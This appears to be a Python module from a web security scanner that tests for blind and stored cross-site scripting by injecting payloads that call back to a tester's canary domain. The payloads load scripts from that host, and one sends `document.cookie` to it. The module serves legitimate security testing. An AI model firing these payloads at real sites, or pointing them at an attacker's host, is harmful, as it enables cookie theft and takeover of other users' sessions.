"""Blind / Stored XSS via out-of-band callback (canary domain only).

Injects payloads that, IF they execute anywhere (including later, in an admin
panel), call back to your canary. Confirms blind & stored XSS that reflected
checks miss. Requires a canary domain; skips otherwise.
"""
from __future__ import annotations

from modules.base import BaseModule, ScanContext, register
from core.result import Finding, Severity
from core.injection_points import discover_points, send


@register
class BlindXSS(BaseModule):
    id = "blind_xss"
    name = "Blind / Stored XSS (OOB)"
    category = "Injection"
    scope = "page"
    description = "Injects canary-callback XSS payloads into params/forms to catch blind & stored XSS via OOB."

    def _payloads(self, host: str, token: str):
        u = f"//{host}/{token}"
        return [
            f'"><script src={u}></script>',
            f"'><script src={u}></script>",
            f'<img src=x onerror="s=document.createElement(\'script\');s.src=\'{u}\';document.body.appendChild(s)">',
            f'<svg onload="fetch(\'https:{u}?c=\'+encodeURIComponent(document.cookie))">',
            f'javascript:eval(atob("")) //{u}',
        ]

    def run(self, ctx: ScanContext) -> list[Finding]:
        oob = ctx.oob
        if oob is None or not oob.enabled:
            ctx.log("    OOB canary not configured — skipping blind XSS (safe default).")
            return []
        points = discover_points(ctx)
        if not points:
            return []
        findings: list[Finding] = []
        tested = []
        poll = bool(oob.poll_url)
        ctx.log(f"    injecting blind-XSS canary into {len(points)} point(s)")
        for pt in points:
            if ctx.should_stop():
                break
            token = oob.new_token("bx")
            for payload in self._payloads(oob.host(token), token):
                if ctx.should_stop():
                    break
                send(ctx, pt, payload)
            tested.append(f"{pt.label()} -> {oob.host(token)}")
            if poll and oob.check(token):
                findings.append(Finding(
                    module_id=self.id, title=f"Blind/Stored XSS confirmed via {pt.label()}",
                    severity=Severity.HIGH, url=pt.base_url, confidence="Confirmed",
                    description="An injected XSS payload executed out-of-band (callback to the canary), "
                                "confirming blind or stored XSS.",
                    evidence=f"Canary callback token {token} ({oob.host(token)})",
                    request=f"{pt.method} {pt.base_url} ({pt.param}=<xss>)",
                    impact="관리자 등 다른 사용자 컨텍스트에서 실행 → 세션 탈취/계정 탈취.",
                    remediation="Context-aware output encoding everywhere; CSP; sanitize stored content."))
        if not poll and tested:
            findings.append(Finding(
                module_id=self.id, title="Blind XSS payloads sent — verify OOB logs",
                severity=Severity.INFO, url=ctx.target, confidence="Tentative",
                description="No OOB poll logger configured; check your canary logs for any callback (a hit = "
                            "blind/stored XSS, possibly firing later in an admin panel).",
                evidence="\n".join(tested[:40]),
                remediation="Configure an OOB poll URL for auto-confirmation."))
        return findings
